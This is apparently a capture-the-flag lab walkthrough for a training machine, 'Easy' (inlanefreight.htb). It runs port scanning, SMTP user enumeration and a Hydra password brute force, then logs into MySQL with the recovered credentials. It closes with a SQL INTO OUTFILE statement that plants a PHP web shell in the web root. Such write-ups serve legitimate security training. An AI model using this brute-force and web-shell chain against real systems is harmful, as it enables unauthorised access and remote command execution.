## Easy

**IP**
```
10.129.54.68
```

**NMAP**
```
nmap -p- -Pn -sC 10.129.54.68
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-08 21:57 EST
Nmap scan report for inlanefreight.htb (10.129.54.68)
Host is up (0.024s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
25/tcp   open  smtp
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http
| http-title: Welcome to XAMPP
|_Requested resource was http://inlanefreight.htb/dashboard/
443/tcp  open  https
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
|_ssl-date: 2024-01-09T03:03:04+00:00; -1s from scanner time.
587/tcp  open  submission
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql
3389/tcp open  ms-wbt-server
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2024-01-08T02:45:58
|_Not valid after:  2024-07-09T02:45:58
|_ssl-date: 2024-01-09T03:03:03+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2024-01-09T03:03:03+00:00


```



**Credentials Found:**

Email
```
fiona@inlanefreight.htb
```

Username
```
fiona@inlanefreight.htb
```

Password
```
987654321
```


**SMTP USER ENUMERATION**
```
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.54.68                                   
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Mon Jan  8 22:40:53 2024 #########
10.129.54.68: fiona@inlanefreight.htb exists
######## Scan completed at Mon Jan  8 22:40:55 2024 #########
1 results.

79 queries in 2 seconds (39.5 queries / sec)
```


**Hydra - Password Brute Forcing**

```
hydra -l fiona@inlanefreight.htb -P passwords.list -f 10.129.54.68 smtp

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-08 22:50:30
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 250 login tries (l:1/p:250), ~16 tries per task
[DATA] attacking smtp://10.129.54.68:25/
[25][smtp] host: 10.129.54.68   login: fiona@inlanefreight.htb   password: 987654321
[STATUS] attack finished for 10.129.54.68 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-08 22:50:35

```

**MySQL Login**

Using the credentials found, login into mysql
```
mysql -h inlanefreight.htb -u fiona -p

Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

**mysql database**

- use the mysql database
- create a file
```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

